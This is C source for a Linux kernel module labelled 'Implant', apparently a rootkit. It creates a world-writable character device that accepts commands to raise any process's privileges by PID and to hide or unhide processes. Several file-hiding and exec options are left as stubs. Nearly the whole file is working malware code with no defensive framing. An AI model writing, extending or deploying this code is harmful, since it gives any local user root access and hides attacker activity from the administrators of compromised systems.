#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/string.h>

#include "ketopt.h"
#include "privilege_escalation.h"
#include "hide_proc.h"

MODULE_DESCRIPTION("Implant");
MODULE_AUTHOR("sc");
MODULE_LICENSE("GPL");

#ifndef IMPLANT_DEVICE_NAME
#define IMPLANT_DEVICE_NAME "implant"
#endif

#ifndef IMPLANT_CLASS_NAME
#define IMPLANT_CLASS_NAME "implant"
#endif

static int implant_major;
static struct class *implant_class = NULL;
static struct device *implant_device = NULL;

static ssize_t implant_dev_read(struct file *fp, char __user *buf, size_t len,
				loff_t *offset);
static ssize_t implant_dev_write(struct file *fp, const char *buf, size_t len,
				 loff_t *offset);
int implant_handle_args(const char *buf);
int implant_dispatch_cmd(int argc, char **argv);

struct file_operations fops = { .read = implant_dev_read,
				.write = implant_dev_write };

static ko_longopt_t priv_longopts[] = {
	{ "pid", ko_required_argument, 101 },
	{ "perm", ko_required_argument, 102 },
	{ NULL, 0, 0 },
};

static ko_longopt_t proc_longopts[] = {
	{ "show", ko_required_argument, 201 },
	{ "hide", ko_required_argument, 202 },
	{ "kill", ko_required_argument, 203 },
	{ "exec", ko_required_argument, 204 },
	{ NULL, 0, 0 },
};

static ko_longopt_t file_longopts[] = {
	{ "show", ko_required_argument, 301 },
	{ "hide", ko_required_argument, 302 },
	{ NULL, 0, 0 },
};

static ssize_t implant_dev_read(struct file *fp, char __user *buf, size_t len,
				loff_t *offset)
{
	return 0;
}

int implant_dispatch_cmd(int argc, char **argv)
{
	ketopt_t opt_main = KETOPT_INIT;
	ketopt_t opt_sub = KETOPT_INIT;
	ko_longopt_t *longopts = NULL;
	char *cmd = NULL;
	int err = 0;
	int c;

	while ((c = ketopt(&opt_main, argc, argv, 0, "", 0)) >= 0) {
		/* read until first command */
	}

	if (opt_main.ind == argc) {
		printk(KERN_WARNING "%s: Missing command\n", THIS_MODULE->name);
		return -EINVAL;
	}

	cmd = argv[opt_main.ind];
	if (strncmp("priv", cmd, 4) == 0) {
		longopts = priv_longopts;
	} else if (strncmp("ps", cmd, 2) == 0) {
		longopts = proc_longopts;
	} else if (strncmp("file", cmd, 4) == 0) {
		longopts = file_longopts;
	} else {
		printk(KERN_WARNING "%s: Unknown command\n", THIS_MODULE->name);
		return -EINVAL;
	}

	/* parse command arguments */
	while ((c = ketopt(&opt_sub, argc - opt_main.ind, argv + opt_main.ind,
			   1, "", longopts)) >= 0) {
		switch (c) {
		case 101:
			if (opt_sub.arg) {
				int pid;
				if (kstrtol(opt_sub.arg, 10, (long *)&pid)) {
					err++;
					break;
				}
				escalate_pid(pid);
			} else {
				err++;
			}
			break;
		case 102:
			/* TODO: perm is ignored for now */
			break;
		case 201:
			if (opt_sub.arg) {
				unhide_proc(opt_sub.arg);
			} else {
				err++;
			}
			break;
		case 202:
			if (opt_sub.arg) {
				hide_proc(opt_sub.arg);
			} else {
				err++;
			}
			break;
		case 203:
			/* TODO: implement later */
			break;
		case 204:
			/* TODO: implement later */
			break;
		case 301:
			/* TODO: implement later */
			break;
		case 302:
			/* TODO: implement later */
			break;
		case '?':
			printk(KERN_WARNING "%s: Unknown option: -%c\n",
			       THIS_MODULE->name,
			       opt_sub.opt ? opt_sub.opt : ':');
			err++;
			break;
		case ':':
			printk(KERN_WARNING "%s: Missing arg: -%c\n",
			       THIS_MODULE->name,
			       opt_sub.opt ? opt_sub.opt : ':');
			err++;
			break;
		default:
			printk(KERN_WARNING "%s: Unable to handle arguments\n",
			       THIS_MODULE->name);
			err++;
			break;
		}
	}

	return err ? -EINVAL : 0;
}

int implant_handle_args(const char *buf)
{
	int ret = 0;
	int argc = 0;
	char **argv = argv_split(GFP_KERNEL, buf, &argc);

	ret = implant_dispatch_cmd(argc, argv);

	argv_free(argv);

	return ret;
}

static ssize_t implant_dev_write(struct file *fp, const char *buf, size_t len,
				 loff_t *offset)
{
	int ret = 0;
	char *args_buf = kcalloc(len + 1, sizeof(char), GFP_KERNEL);

	if (!args_buf) {
		printk(KERN_WARNING "%s: Failed to allocate command buffer",
		       THIS_MODULE->name);
		ret = -ENOMEM;
		goto err;
	}

	ret = copy_from_user(args_buf, buf, len);
	if (ret) {
		ret = -ret;
		goto err_free_buf;
	}

	implant_handle_args(args_buf);
	/* ignores incorrect commands/args */
	ret = len;

err_free_buf:
	kfree(args_buf);
err:
	return ret;
}

static char *implant_devnode(struct device *dev, umode_t *mode)
{
	if (!mode) {
		return NULL;
	}

	if (dev->devt == MKDEV(implant_major, 0)) {
		*mode = 0666;
	}

	return NULL;
}

static int __init implant_init(void)
{
	int ret = 0;

	printk(KERN_INFO "%s: Loaded\n", THIS_MODULE->name);

	ret = hide_proc_init();

	if (ret) {
		goto err;
	}

	implant_major = register_chrdev(0, IMPLANT_DEVICE_NAME, &fops);
	if (implant_major < 0) {
		ret = implant_major;
		goto err;
	}

	printk(KERN_INFO "%s: Registered with major %d\n", THIS_MODULE->name,
	       implant_major);

	implant_class = class_create(THIS_MODULE, IMPLANT_CLASS_NAME);
	if (IS_ERR(implant_class)) {
		ret = PTR_ERR(implant_class);
		goto err_unreg_dev;
	}
	printk(KERN_INFO "%s: Device class registered\n", THIS_MODULE->name);
	/* override permission */
	implant_class->devnode = implant_devnode;

	implant_device =
		device_create(implant_class, NULL, MKDEV(implant_major, 0),
			      NULL, IMPLANT_DEVICE_NAME);
	if (IS_ERR(implant_device)) {
		ret = PTR_ERR(implant_device);
		goto err_destroy_class;
	}
	printk(KERN_INFO "%s: Device class created\n", THIS_MODULE->name);

	return 0;

err_destroy_class:
	class_destroy(implant_class);
err_unreg_dev:
	unregister_chrdev(implant_major, IMPLANT_DEVICE_NAME);
err:
	return ret;
}

static void __exit implant_exit(void)
{
	hide_proc_exit();

	device_destroy(implant_class, MKDEV(implant_major, 0));
	class_unregister(implant_class);
	class_destroy(implant_class);
	unregister_chrdev(implant_major, IMPLANT_DEVICE_NAME);

	printk(KERN_INFO "%s: Unloaded\n", THIS_MODULE->name);
}

module_init(implant_init);
module_exit(implant_exit);
